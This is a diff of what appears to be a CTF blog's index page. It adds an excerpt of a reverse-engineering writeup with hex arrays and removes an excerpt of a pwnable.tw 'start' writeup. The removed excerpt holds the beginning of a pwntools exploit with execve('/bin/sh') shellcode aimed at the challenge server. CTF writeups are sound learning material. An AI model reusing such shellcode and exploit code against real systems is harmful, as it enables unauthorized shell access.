@@ -145,6 +145,54 @@
     
     
     <div class="col-12 col-md-8 mx-auto index-info">
+      <a href="/掘安RE_crypto.html">
+        <p class="h4 index-header">jactf-reverse3</p>
+      </a>
+
+      <a href="/掘安RE_crypto.html">
+        
+        
+          
+        
+        <div class="index-excerpt">
+          <div class="index-text mb-1">RE_crypto
+ida
+
+
+程序逻辑不难，输入的字符作为unk_4021A0数组的下标，定位该下标所对应的值，与((v11 + v12) ^ 0x19)比较，这个值是可以自己算出来的
+
+expbyte1=[0x32,0x61,0x34,0x39,0x66,0x36,0x39,0x63,0x33,0x38,0x33,0x39,0x35,0x63,0x64,0x65,0x39,0x36,0x64,0x36,0x64,0x65,0x39,0x36,0x64,0x36,0x66,0x34,0x65,0x30,0x32,0x35,0x34,0x38,0x34,0x39,0x35,0x34,0x64,0x36,0x31,0x39,0x35,0x34,0x34,0x38,0x64,0x65,0x66,0x36,0x65,0x32,0x64,0x61,0x64,0x36,0x37,0x37,0x38,0x36,0x65,0x32,0x31,0x64,0x35,0x61,0x64,0x61,0x65,0x36]
+
+byte = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-16&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/reverse">reverse</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/writeup">writeup</a>&nbsp;
+          
+            <a href="/tags/jactf">jactf</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-8 mx-auto index-info">
       <a href="/记一次控制流平坦化逆向.html">
         <p class="h4 index-header">记一次控制流平坦化逆向</p>
       </a>
@@ -739,69 +787,6 @@ public class MainActivity extends c {
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/android">android</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-8 mx-auto index-info">
-      <a href="/pwnable-tw-start.html">
-        <p class="h4 index-header">pwnable.tw-start</p>
-      </a>
-
-      <a href="/pwnable-tw-start.html">
-        
-        
-          
-        
-        <div class="index-excerpt">
-          <div class="index-text mb-1">start
-checksec
-ida查看
-
-发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的
-
-
-
-gdb调试得知偏移为20
-
-expfrom pwn import *
-
-context.arch = &#39;i386&#39;
-context.log_level=&quot;debug&quot;
-pro = remote(&quot;chall.pwnable.tw&quot;,10000)
-ret = 0x8048087
-
-shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;
-&#39;&#39;&#39;
-shellcode = asm(&#39;\n&#39;.join([
-    &#39;push %d&#39; % u32(&#39;/sh\0&#39;),
-    &#39;push %d&#39; % u32(&#39;/bin&#39</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-11&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/pwn">pwn</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/pwn">pwn</a>&nbsp;
-          
-            <a href="/tags/writeup">writeup</a>&nbsp;
-          
-            <a href="/tags/pwnable-tw">pwnable.tw</a>&nbsp;
           
         
       </div>
